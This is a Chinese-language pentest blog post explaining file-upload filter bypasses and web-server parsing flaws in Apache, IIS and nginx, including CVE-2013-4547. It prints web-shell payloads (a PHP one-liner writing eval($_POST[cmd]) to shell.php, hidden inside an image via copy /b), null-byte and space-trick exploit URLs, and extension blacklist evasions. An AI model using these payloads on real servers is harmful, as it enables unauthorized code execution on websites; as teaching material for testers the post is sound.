<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>PenTest Vol.1 - Web | 文件上传绕过 &amp;&amp; 文件解析漏洞 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">PenTest Vol.1 - Web | 文件上传绕过 &amp;&amp; 文件解析漏洞</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>10 Minutes</li><li><i class="icon icon-calendar"></i>May 20, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="PenTest-Vol-1-Web-文件上传绕过-amp-amp-文件解析漏洞"><a href="#PenTest-Vol-1-Web-文件上传绕过-amp-amp-文件解析漏洞" class="headerlink" title="PenTest Vol.1 - Web | 文件上传绕过 &amp;&amp; 文件解析漏洞"></a><center>PenTest Vol.1 - Web | 文件上传绕过 &amp;&amp; 文件解析漏洞</center></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>文件上传绕过一般有：</p>
<ul>
<li>前端绕过</li>
<li>服务端绕过</li>
<li>配合中间件解析漏洞突破上传</li>
<li>编辑器漏洞</li>
</ul>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>一般是前端 JS 检测文件的后缀，只需要先上传允许的文件后缀然后 burp 抓包改包即可。</p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="MIME-检测绕过"><a href="#MIME-检测绕过" class="headerlink" title="MIME 检测绕过"></a>MIME 检测绕过</h4><p>也就是检测 content-type 的内容，burp 抓包修改为允许的类型即可，比如 image/jpeg。</p>
<h4 id="文件名检测"><a href="#文件名检测" class="headerlink" title="文件名检测"></a>文件名检测</h4><ul>
<li><p>黑名单：不允许 php/asp/aspx 等后缀上传</p>
<p>黑名单的安全性要比白名单弱，一般有专门的 blacklist，包含常见的危险脚本文件。</p>
<p><img src="http://47.95.140.43/tu/Pentest1/857264-20180616163914647-1974550347.png" alt="857264-20180616163914647-1974550347"></p>
<p>绕过姿势：</p>
<ul>
<li><p>文件名大小写绕过：pHp/AsP等</p>
</li>
<li><p>修改为 php2/php3/php5/phtml/asp/aspx/ascx/ashx/<strong>cer</strong>/<strong>asa</strong>/jsp/jspx/cdx</p>
</li>
<li><p>特殊文件名：把文件名改为 test.php. 或 test.asp_ （下划线是空格），在 Windows 中这种命名格式是不允许的，会自动去掉点和空格，但是 unix 和 Linux 系统没有这个特性。</p>
</li>
<li><p>0x00 截断：截断的核心就是 chr(0) 这个字符不为空，也不是空格，当程序在输出含有 chr(0) 变量的时候，后面的数据会被忽略，导致漏洞产生。该漏洞在 php 5.3.4 中被修复，但在之前的版本中仍然有危害。</p>
<p>文件名 a.asp_.jpg 修改为 a.asp%00.jpg</p>
<p>用 burp 抓包设置 hex，比如 xxx.php_.jpg 中 php 后面的 _ 对应 hex 值为 5f，修改为 00 即可。</p>
</li>
<li><p>.htaccess 文件攻击（结合黑名单攻击）</p>
</li>
</ul>
</li>
</ul>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>只能上传图片，但是可以利用图片和脚本文件制作一个图片马，比如 1.gif 和 2.txt，前面的图片要尽量简单否则会干扰制作后的文件内容解析，利用命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b 1.gif + 2.txt = new.php</span><br></pre></td></tr></table></figure>

<p>然后再利用上面的方法绕过文件名检测。</p>
<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><p>参考：<a href="https://blog.csdn.net/wn314/article/details/77074477" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/77074477</a></p>
<ul>
<li><p>test.php.aaa.bbb.ccc 当 Apache 和 php 以 module 方式结合的时候，Apache 解析文件是从后向前解析的，直到遇到认识的才开始解析。</p>
<p>关键在于 apache 的 mime.types 文件，其中包含了 Apache 认识的文件后缀类型。</p>
</li>
</ul>
<h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><p>详细：<a href="https://lcx.cc/post/1958/" target="_blank" rel="noopener">https://lcx.cc/post/1958/</a></p>
<p>参考：<a href="https://blog.csdn.net/wn314/article/details/77388337" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/77388337</a></p>
<ul>
<li>dir.asp/任意文件名</li>
<li>test.asp;.任意文件名</li>
<li>URL：任意文件名/任意文件名.php，比如 muma.jpg/qqq.php</li>
</ul>
<p>IIS 6.0 在解析 asp 文件时有两个解析漏洞：</p>
<ol>
<li><p>如果目录名以 .asp .asa .cer .cdx 字符串结尾，那么这个目录下所有的文件都会按照 asp 去解析，比如目标网站含有目录名为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.asp/1.jpg</span><br></pre></td></tr></table></figure>

<p>那么该文件会被当作 asp 解析。</p>
</li>
<li><p>只要文件名中含有 .asp; .asa; .cer; .cdx; 会优先按 asp 来解析，此时我们可以 burp 抓包修改文件名为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.asp;.jpg</span><br></pre></td></tr></table></figure>

<p>那么该文件会优先按 asp 解析。</p>
</li>
</ol>
<p>IIS 7.0/7.5 对 php 解析时有一个类似于 nginx 的漏洞，对任意文件名只要在 URL 后面追加上字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/任意文件名.php</span><br></pre></td></tr></table></figure>

<p>那么就会按照解析 php 的方式去解析。</p>
<p>利用条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.ini 中 cgi.fix_pathinfo=1（默认为1）</span><br></pre></td></tr></table></figure>

<p>在handler mapping中取消勾选：</p>
<p><img src="http://47.95.140.43/tu/Pentest1/c.png" alt="c"></p>
<p>利用方式：</p>
<p>将一张图和一个写入后门代码的文本文档合并，并将恶意文本写入图片的二进制代码之后，避免破环图片文件头和尾。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// /b 即二进制模式 /a 即 ascii 模式</span><br><span class="line">// yy.txt 内容：&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br><span class="line">copy xx.jpg /b + yy.txt /a xy.jpg</span><br></pre></td></tr></table></figure>

<p>成功上传 xy.jpg 后，得知目标中间件为 IIS 7.0/7.5，我们可以尝试访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/uploads/xy.jpg/asdf.php</span><br></pre></td></tr></table></figure>

<p>然后就在目录下生成一句话木马 shell.php，密码为 cmd。</p>
<h3 id="IIS-6-0-PUT-漏洞"><a href="#IIS-6-0-PUT-漏洞" class="headerlink" title="IIS 6.0 PUT 漏洞"></a>IIS 6.0 PUT 漏洞</h3><p>IIS 6.0 写权限漏洞是网站配置不当造成的。当开启 WebDAV 和网站写权限时就会造成漏洞。</p>
<h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><p>参考：<a href="https://blog.csdn.net/wn314/article/details/77388289/" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/77388289/</a></p>
<ol>
<li><strong>nginx 配置错误导致解析漏洞</strong></li>
</ol>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.jpg/test.php</span><br></pre></td></tr></table></figure>

<p>准备文件 test.jpg，内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>

<p>直接访问 <a href="http://127.0.0.1/test.jpg" target="_blank" rel="noopener">http://127.0.0.1/test.jpg</a> 会报图片解析错误，修改 URL 访问 <a href="http://127.0.0.1/test.jpg/test.php，显示" target="_blank" rel="noopener">http://127.0.0.1/test.jpg/test.php，显示</a> Access denied（应当显示404），说明 nginx 处理文件有问题。</p>
<p>nginx 只要一看到 URL 中路径名以 php 结尾，便不管该文件是否存在，直接交给 php 处理。（IIS 在这一点和 nginx 是一样的，同样存在这个问题。）而 Apache 等，会先看该文件是否存在，若存在再决定该如何处理。</p>
<p>php 拿到文件看到 /test.jpg/test.php 不存在，便删去 /test.php，看到 /test.jpg 是存在的，于是把 /test.jpg 当做要执行的文件，又因为后缀为 .jpg，php 认为这不是 php 文件，于是返回 Access denied。</p>
<p>其中涉及到 php 的一个选项 cgi.fix_pathinfo，默认为 1 表示开启，会对文件路径进行修正。没有成功执行的原因是新版本的 php 引入了 security.limit_extensions，限制了可执行文件的后缀，默认只允许执行 .php 文件，配置文件为 php-fpm.conf。</p>
<ol start="2">
<li><strong>%00 截断</strong></li>
</ol>
<p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.5.,		0.6.,		0.7., &lt;= 0.7.65</span><br></pre></td></tr></table></figure>

<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.jpg%00.php</span><br></pre></td></tr></table></figure>

<p>找不到老版本的 nginx，放弃。</p>
<ol start="3">
<li><strong>CVE-2013-4547</strong></li>
</ol>
<p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.8.41~1.4.3,		1.5 &lt;= 1.5.7</span><br></pre></td></tr></table></figure>

<p>漏洞原理是非法字符空格和截止符（\0）会导致 nginx 解析 URI 时的有限状态机混乱。</p>
<p>条件：存在以空格结尾的文件，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;test.jpg &quot;</span><br><span class="line">//注意空格</span><br><span class="line">内容为：</span><br><span class="line">&lt;?php eval_GET[muma]?&gt;</span><br></pre></td></tr></table></figure>

<p>利用方法：</p>
<p>访问：<a href="http://127.0.0.1/test.jpg...php" target="_blank" rel="noopener">http://127.0.0.1/test.jpg...php</a></p>
<p>burp 抓包 -&gt; hex 编码，第一个 . 改为 20（空格），第二个 . 改为 00（\0），然后 forward 请求即可（可能会被 security.limit_extensions 阻止执行）。</p>
<ul>
<li>同时 CVE-2013-4547 也可用于绕过访问限制（包含空格的目录）。</li>
</ul>
<p>假设 /protected/ 目录禁止访问，直接访问 /protected/a.html 返回 403 被拒绝。新建一个目录为”test “（注意空格），直接访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test /../protect/a.html</span><br><span class="line">//注意空格不要编码：url decode</span><br></pre></td></tr></table></figure>

<p>最后：Linux 中可利用，因为 Linux 允许文件以空格结尾，但是在 Windows 中很难利用，因为 Windows 会自动将空格去掉。</p>
<p><strong>查漏补缺：00 截断详细，.htaccess 文件攻击，nginx 解析漏洞，php inclusion 漏洞</strong></p>
<p>在 url 中输入 xxx.php?filename=test.php%00.txt，实际输出为 test.php</p>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71huqi4000gi7ozegdw23e6" data-title="PenTest Vol.1 - Web | 文件上传绕过 &amp;&amp; 文件解析漏洞" data-url="http://www.naykcin.top/2019/05/20/文件上传-解析漏洞/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/06/04/MS12-020漏洞复现/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/05/05/MS17-010漏洞复现/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>